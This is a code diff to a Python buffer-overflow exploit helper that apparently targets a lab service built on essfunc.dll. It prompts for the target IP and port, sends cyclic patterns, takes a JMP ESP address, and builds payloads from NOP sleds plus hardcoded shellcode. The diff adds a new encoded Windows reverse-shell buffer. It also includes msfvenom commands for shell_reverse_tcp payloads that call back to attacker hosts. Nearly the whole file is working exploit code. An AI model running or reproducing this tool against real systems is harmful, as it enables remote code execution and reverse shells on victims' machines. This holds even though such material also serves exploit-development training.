@@ -6,7 +6,7 @@ import time
 
 class JihadLibrary(object):
     def ip(self):
-        return input(colors.BOLD +"What is the ip address(127.0.0.1): " + colors.END) or "127.0.0.1"
+        return input(colors.BOLD +"What is the ip address(127.1.0.1): " + colors.END) or "127.1.0.1"
     def port(self):
         return int(input(colors.BOLD +"What is the the port(9999) : " + colors.END) or "9999")
 
@@ -123,7 +123,7 @@ class JihadLibrary(object):
         character = input("what is the character(random): ") or self.randomCharacters(1)
         totalCharacter = int(input("What is the number of character(9999) : ") or "9999")
         payload = JihadLibrary().createPattern(totalCharacter) 
-        
+        payload += "\r\n"
                
         return payload, totalCharacter
 
@@ -141,15 +141,15 @@ class JihadLibrary(object):
                 reverseShell = ""
                 JMP_ESP = self.findJMP_ESP()
                 
-                space = b"\x90"*32
+                space = b"\x90"*12
                 enter = b'\r\n'
-                payload +=  b"\xdf\x14\x50\x62" # JMP_ESP #
+                payload += JMP_ESP # \xC3\x14\x04\x08 b"\xdf\x14\x50\x62" 
                 payload += space
                 selectedShell = input(colors.WARNING + """
     Select Shell type?\n
       [1] Generate Reverse Shell(beta).
       [2] Generate Calculator Shell.
-                    """ + colors.END) or b"\xdf\x14\x50\62"
+                    """ + colors.END) or "1"
                 if selectedShell == "1":
                     reverseShell = self.generateReverseShell()   
                 elif selectedShell == "2":
@@ -179,6 +179,7 @@ class JihadLibrary(object):
                 s.close()
                 break
     def findJMP_ESP(self):
+        import struct
         # !mona modules
         # 
         JMP_ESP = input(colors.WARNING + """
@@ -187,17 +188,85 @@ class JihadLibrary(object):
         !mona modules
         2. search for the esp
         !mona find -s "\-xff\-xe4" -m essfunc.dll
-        3. write the character in backward and add \-x with out - for example 
-        this 625014DF will become "\-xdf\-x14\-x50\-62" with out -
+        3. write the character in backward and add - for example 
+        this 625014DF will become DF145062 with out -
         What is the esp:
         JMP_ESP
         
-        """ + colors.END) or b"\xdf\x14\x50\62"
+        """ + colors.END) or "BF160408"
+
+
+
         # use struct library to convert jpm_esp to binary
-        # JMP_ESP = struct.pack("<I", JMP_ESP)
+        JMP_ESP = bytearray.fromhex(JMP_ESP)
+        print()
         return  JMP_ESP #+ b"\x90" * 32
     def generateReverseShell(self):
         # the shell
+        buf =  b""
+        buf += b"\xd9\xd0\xd9\x74\x24\xf4\x58\x2b\xc9\xba\xab\xd2"
+        buf += b"\x42\x83\xb1\x52\x31\x50\x17\x83\xc0\x04\x03\xfb"
+        buf += b"\xc1\xa0\x76\x07\x0d\xa6\x79\xf7\xce\xc7\xf0\x12"
+        buf += b"\xff\xc7\x67\x57\x50\xf8\xec\x35\x5d\x73\xa0\xad"
+        buf += b"\xd6\xf1\x6d\xc2\x5f\xbf\x4b\xed\x60\xec\xa8\x6c"
+        buf += b"\xe3\xef\xfc\x4e\xda\x3f\xf1\x8f\x1b\x5d\xf8\xdd"
+        buf += b"\xf4\x29\xaf\xf1\x71\x67\x6c\x7a\xc9\x69\xf4\x9f"
+        buf += b"\x9a\x88\xd5\x0e\x90\xd2\xf5\xb1\x75\x6f\xbc\xa9"
+        buf += b"\x9a\x4a\x76\x42\x68\x20\x89\x82\xa0\xc9\x26\xeb"
+        buf += b"\x0c\x38\x36\x2c\xaa\xa3\x4d\x44\xc8\x5e\x56\x93"
+        buf += b"\xb2\x84\xd3\x07\x14\x4e\x43\xe3\xa4\x83\x12\x60"
+        buf += b"\xaa\x68\x50\x2e\xaf\x6f\xb5\x45\xcb\xe4\x38\x89"
+        buf += b"\x5d\xbe\x1e\x0d\x05\x64\x3e\x14\xe3\xcb\x3f\x46"
+        buf += b"\x4c\xb3\xe5\x0d\x61\xa0\x97\x4c\xee\x05\x9a\x6e"
+        buf += b"\xee\x01\xad\x1d\xdc\x8e\x05\x89\x6c\x46\x80\x4e"
+        buf += b"\x92\x7d\x74\xc0\x6d\x7e\x85\xc9\xa9\x2a\xd5\x61"
+        buf += b"\x1b\x53\xbe\x71\xa4\x86\x11\x21\x0a\x79\xd2\x91"
+        buf += b"\xea\x29\xba\xfb\xe4\x16\xda\x04\x2f\x3f\x71\xff"
+        buf += b"\xb8\x4a\x8f\xe3\xc7\x23\x8d\x1b\x26\xd5\x18\xfd"
+        buf += b"\x3c\x05\x4d\x56\xa9\xbc\xd4\x2c\x48\x40\xc3\x49"
+        buf += b"\x4a\xca\xe0\xae\x05\x3b\x8c\xbc\xf2\xcb\xdb\x9e"
+        buf += b"\x55\xd3\xf1\xb6\x3a\x46\x9e\x46\x34\x7b\x09\x11"
+        buf += b"\x11\x4d\x40\xf7\x8f\xf4\xfa\xe5\x4d\x60\xc4\xad"
+        buf += b"\x89\x51\xcb\x2c\x5f\xed\xef\x3e\x99\xee\xab\x6a"
+        buf += b"\x75\xb9\x65\xc4\x33\x13\xc4\xbe\xed\xc8\x8e\x56"
+        buf += b"\x6b\x23\x11\x20\x74\x6e\xe7\xcc\xc5\xc7\xbe\xf3"
+        buf += b"\xea\x8f\x36\x8c\x16\x30\xb8\x47\x93\x40\xf3\xc5"
+        buf += b"\xb2\xc8\x5a\x9c\x86\x94\x5c\x4b\xc4\xa0\xde\x79"
+        buf += b"\xb5\x56\xfe\x08\xb0\x13\xb8\xe1\xc8\x0c\x2d\x05"
+        buf += b"\x7e\x2c\x64"
+        payload =  b""
+        payload += b"\xdd\xc1\xd9\x74\x24\xf4\x5e\xbd\xf6\x5b\x39"
+        payload += b"\xf4\x29\xc9\xb1\x52\x31\x6e\x17\x83\xc6\x04"
+        payload += b"\x03\x98\x48\xdb\x01\x98\x87\x99\xea\x60\x58"
+        payload += b"\xfe\x63\x85\x69\x3e\x17\xce\xda\x8e\x53\x82"
+        payload += b"\xd6\x65\x31\x36\x6c\x0b\x9e\x39\xc5\xa6\xf8"
+        payload += b"\x74\xd6\x9b\x39\x17\x54\xe6\x6d\xf7\x65\x29"
+        payload += b"\x60\xf6\xa2\x54\x89\xaa\x7b\x12\x3c\x5a\x0f"
+        payload += b"\x6e\xfd\xd1\x43\x7e\x85\x06\x13\x81\xa4\x99"
+        payload += b"\x2f\xd8\x66\x18\xe3\x50\x2f\x02\xe0\x5d\xf9"
+        payload += b"\xb9\xd2\x2a\xf8\x6b\x2b\xd2\x57\x52\x83\x21"
+        payload += b"\xa9\x93\x24\xda\xdc\xed\x56\x67\xe7\x2a\x24"
+        payload += b"\xb3\x62\xa8\x8e\x30\xd4\x14\x2e\x94\x83\xdf"
+        payload += b"\x3c\x51\xc7\x87\x20\x64\x04\xbc\x5d\xed\xab"
+        payload += b"\x12\xd4\xb5\x8f\xb6\xbc\x6e\xb1\xef\x18\xc0"
+        payload += b"\xce\xef\xc2\xbd\x6a\x64\xee\xaa\x06\x27\x67"
+        payload += b"\x1e\x2b\xd7\x77\x08\x3c\xa4\x45\x97\x96\x22"
+        payload += b"\xe6\x50\x31\xb5\x09\x4b\x85\x29\xf4\x74\xf6"
+        payload += b"\x60\x33\x20\xa6\x1a\x92\x49\x2d\xda\x1b\x9c"
+        payload += b"\xe2\x8a\xb3\x4f\x43\x7a\x74\x20\x2b\x90\x7b"
+        payload += b"\x1f\x4b\x9b\x51\x08\xe6\x66\x32\x3d\xfe\x74"
+        payload += b"\x3d\x29\x02\x84\xdf\xcb\x8b\x62\xb5\x1b\xda"
+        payload += b"\x3d\x22\x85\x47\xb5\xd3\x4a\x52\xb0\xd4\xc1"
+        payload += b"\x51\x45\x9a\x21\x1f\x55\x4b\xc2\x6a\x07\xda"
+        payload += b"\xdd\x40\x2f\x80\x4c\x0f\xaf\xcf\x6c\x98\xf8"
+        payload += b"\x98\x43\xd1\x6c\x35\xfd\x4b\x92\xc4\x9b\xb4"
+        payload += b"\x16\x13\x58\x3a\x97\xd6\xe4\x18\x87\x2e\xe4"
+        payload += b"\x24\xf3\xfe\xb3\xf2\xad\xb8\x6d\xb5\x07\x13"
+        payload += b"\xc1\x1f\xcf\xe2\x29\xa0\x89\xea\x67\x56\x75"
+        payload += b"\x5a\xde\x2f\x8a\x53\xb6\xa7\xf3\x89\x26\x47"
+        payload += b"\x2e\x0a\x56\x02\x72\x3b\xff\xcb\xe7\x79\x62"
+        payload += b"\xec\xd2\xbe\x9b\x6f\xd6\x3e\x58\x6f\x93\x3b"
+        payload += b"\x24\x37\x48\x36\x35\xd2\x6e\xe5\x36\xf7"
         shell = (
                 b"\xbd\xa9\x2b\x5a\xe3\xdb\xc4\xd9\x74\x24\xf4\x5e\x33\xc9"+
                 b"\xb1\x52\x83\xee\xfc\x31\x6e\x0e\x03\xc7\x25\xb8\x16\xeb"+
@@ -225,8 +294,8 @@ class JihadLibrary(object):
                 b"\x06\xc1\xbe\x31\xcf\x90\x82\x5f\xf0\x4f\xc0\x59\x73\x65"+
                 b"\xb9\x9d\x6b\x0c\xbc\xda\x2b\xfd\xcc\x73\xde\x01\x62\x73"+
                 b"\xcb")
-      
-        return shell
+        return payload
+    
     def generateCalculatorShell(self):
         shellcode =  b""
         shellcode += b"\x29\xc9\x83\xe9\xcf\xe8\xff\xff\xff\xff\xc0"
@@ -250,12 +319,15 @@ class JihadLibrary(object):
         shellcode += b"\xb2\x09\xb7\xd5\x66\x24\xa4\xf4\xf6\x9b\xc7"
         shellcode += b"\xc6\x65\x2d\x8a\xc2\x71\x2b\xa4\xa7\x09\x4e"
         return shellcode
+    
     def msfVenomCode():
         print("""
         open calculator:
             msfvenom -p windows/exec -b "\ x00" -f python --var-name shellcode CMD=calc.exe EXITFUNC=thread
         reverse shell:
             msfvenom -p windows/shell_reverse_tcp LHOST=172.21.252.174 LPORT=7777 -b "\ x00" -f c
+            msfvenom -p windows/shell_reverse_tcp LHOST=10.9.200.20 LPORT=7777 -e x86/shikata_ga_nai -f exe -b "\ x00\ xa" -f python -v payload
+
         """)
     def badChars():
         character = (
